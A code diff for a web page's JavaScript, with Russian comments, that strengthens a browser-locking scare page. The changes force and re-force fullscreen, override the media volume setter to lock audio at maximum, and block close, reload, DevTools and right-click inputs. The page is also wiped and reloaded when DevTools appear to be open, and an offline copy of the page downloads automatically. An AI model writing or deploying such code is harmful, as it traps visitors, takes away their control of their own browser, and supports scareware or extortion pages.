@@ -21,36 +21,49 @@
         const button = document.getElementById("start");
         const audio = document.getElementById("audio");
 
-        // Функция возврата в полноэкранный режим
-        function forceFullScreen() {
+        // Функция для принудительного входа в полноэкранный режим
+        async function enterFullScreen() {
             if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen().catch(console.error);
+                try {
+                    await document.documentElement.requestFullscreen();
+                } catch (err) {
+                    console.error("Ошибка входа в полноэкранный режим:", err);
+                }
             }
         }
 
-        button.addEventListener("click", async () => {
-            await forceFullScreen();
-            
+        // Функция проверки выхода из полноэкранного режима
+        function enforceFullScreen() {
+            if (!document.fullscreenElement) {
+                enterFullScreen();
+            }
+        }
+
+        // Функция блокировки изменения громкости
+        function lockVolume() {
+            Object.defineProperty(HTMLMediaElement.prototype, 'volume', {
+                get: () => 1.0,
+                set: () => {}
+            });
             audio.volume = 1.0;
+        }
+
+        button.addEventListener("click", async () => {
+            await enterFullScreen();
+            
+            lockVolume();
             audio.play();
 
             button.style.display = "none";
 
             // Следим за выходом из полноэкранного режима
-            document.addEventListener("fullscreenchange", () => {
-                setTimeout(forceFullScreen, 100);
-            });
+            document.addEventListener("fullscreenchange", enforceFullScreen);
 
             // Автоматическая загрузка страницы в офлайн
             downloadOfflinePage();
         });
 
-        // Блокировка изменения громкости
-        Object.defineProperty(HTMLMediaElement.prototype, 'volume', {
-            set: function() {}
-        });
-
-        // Блокировка клавиш выхода и DevTools
+        // Блокировка клавиш выхода, DevTools и перезагрузки
         document.addEventListener("keydown", (e) => {
             if (["F1", "F4", "F5", "F12"].includes(e.key) || 
                 (e.ctrlKey && ["w", "r", "u", "i", "j", "s", "h", "k"].includes(e.key.toLowerCase())) || 
@@ -65,7 +78,7 @@
             e.returnValue = "Вы уверены, что хотите покинуть страницу?";
         });
 
-        // Блокировка DevTools через mousemove
+        // Блокировка DevTools через изменение размеров окна
         setInterval(() => {
             if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
                 document.body.innerHTML = "";
@@ -73,6 +86,9 @@
                 location.reload();
             }
         }, 1000);
+
+        // Блокировка правого клика
+        document.addEventListener("contextmenu", (e) => e.preventDefault());
 
         // Автозагрузка страницы для оффлайн-доступа
         function downloadOfflinePage() {
@@ -87,9 +103,9 @@
             document.body.removeChild(a);
         }
 
-        // Ставим звук на максимум при загрузке страницы
+        // Устанавливаем звук на максимум при загрузке страницы
         window.addEventListener("load", () => {
-            audio.volume = 1.0;
+            lockVolume();
         });
 
     </script>
